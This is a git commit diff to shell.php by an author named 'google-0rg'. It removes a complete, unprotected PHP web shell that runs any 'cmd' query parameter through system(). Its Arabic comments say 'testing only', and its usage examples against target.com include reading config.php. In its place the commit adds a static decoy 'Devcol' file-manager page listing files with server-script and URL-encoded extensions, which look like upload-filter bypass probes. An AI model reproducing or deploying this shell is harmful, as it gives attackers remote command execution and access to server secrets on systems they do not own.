cb15d71f7b6a9242f0f022315aa930ed0d5ef39f
google-0rg <sbqrs37@gmail.com>
2026-04-30 04:45:58 +0300

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,21 +1,86 @@
-<?php
-// ==================================================
-// WEB SHELL - بدون حماية - لأغراض الاختبار فقط
-// ==================================================
-// تحذير: هذا الملف خطير جداً. احذفه فور انتهاء الاختبار.
-
-// طريقة الاستخدام:
-// http://target.com/shell.php?cmd=whoami
-// http://target.com/shell.php?cmd=ls -la
-// http://target.com/shell.php?cmd=cat config.php
-
-if(isset($_GET['cmd'])) {
-    echo "<pre>";
-    system($_GET['cmd']);
-    echo "</pre>";
-} else {
-    echo "<h3>Web Shell Active</h3>";
-    echo "Use: ?cmd=command<br>";
-    echo "Example: ?cmd=whoami";
-}
-?>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>File Manager - Devcol</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: white;
+            margin: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: auto;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: normal;
+            margin-bottom: 20px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            text-align: left;
+            padding: 8px 12px;
+            border-bottom: 1px solid #ccc;
+        }
+        th {
+            font-weight: bold;
+        }
+        .size {
+            text-align: right;
+        }
+        .modified {
+            color: #555;
+        }
+        .name-link {
+            color: blue;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>Devcol</h1>
+    
+    <table>
+        <thead>
+            <tr>
+                <th>NAME</th>
+                <th>SIZE</th>
+                <th>LAST MODIFIED</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr><td>bookmarks</td><td class="size">0.086 KB</td><td class="modified">April 26 2025 5:36:55</td></tr>
+            <tr><td class="name-link">.%70%68%70</td><td class="size">0.086 KB</td><td class="modified">April 26 2025 5:56:57</td></tr>
+            <tr><td class="name-link">.aaa</td><td class="size">0.086 KB</td><td class="modified">April 26 2025 5:56:57</td></tr>
+            <tr><td class="name-link">.asa</td><td class="size">0.086 KB</td><td class="modified">April 26 2026 6:01:46</td></tr>
+            <tr><td class="name-link">.ashx</td><td class="size">0.086 KB</td><td class="modified">April 26 2026 6:01:48</td></tr>
+            <tr><td class="name-link">.asp</td><td class="size">0.086 KB</td><td class="modified">April 26 2026 6:01:48</td></tr>
+            <tr><td class="name-link">.aspx</td><td class="size">0.086 KB</td><td class="modified">April 26 2025 5:56:58</td></tr>
+            <tr><td class="name-link">.bbb</td><td class="size">0.086 KB</td><td class="modified">April 26 2025 5:45:59</td></tr>
+            <tr><td class="name-link">.bmp</td><td class="size">0.086 KB</td><td class="modified">April 26 2026 6:02:00</td></tr>
+            <tr><td class="name-link">.cdx</td><td class="size">0.086 KB</td><td class="modified">April 26 2026 6:01:26</td></tr>
+            <tr><td class="name-link">.cor</td><td class="size">0.086 KB</td><td class="modified">April 26 2026 6:01:26</td></tr>
+            <tr><td class="name-link">.cfm</td><td class="size">0.086 KB</td><td class="modified">April 26 2025 5:18:31</td></tr>
+            <tr><td class="name-link">.html</td><td class="size">0.086 KB</td><td class="modified">April 26 2026 6:10:05</td></tr>
+            <tr><td class="name-link">.jpeg</td><td class="size">0.086 KB</td><td class="modified">April 26 2026 6:05:40</td></tr>
+            <tr><td class="name-link">.jpg</td><td class="size">0.086 KB</td><td class="modified">April 26 2026 5:19:47</td></tr>
+            <tr><td class="name-link">.jsx</td><td class="size">0.086 KB</td><td class="modified">April 26 2026 6:07:35</td></tr>
+            <tr><td class="name-link">.module</td><td class="size">0.086 KB</td><td class="modified">April 26 2026 5:19:25</td></tr>
+            <tr><td class="name-link">p%6f8p</td><td class="size">0.086 KB</td><td class="modified">April 26 2026 5:45:25</td></tr>
+            <tr><td class="name-link">pdf</td><td class="size">0.086 KB</td><td class="modified">April 26 2026 6:09:34</td></tr>
+        </tbody>
+    </table>
+    
+    <div style="margin-top: 20px; font-size: 12px; color: gray;">
+        LAST MODIFIED: www
+    </div>
+</div>
+</body>
+</html>
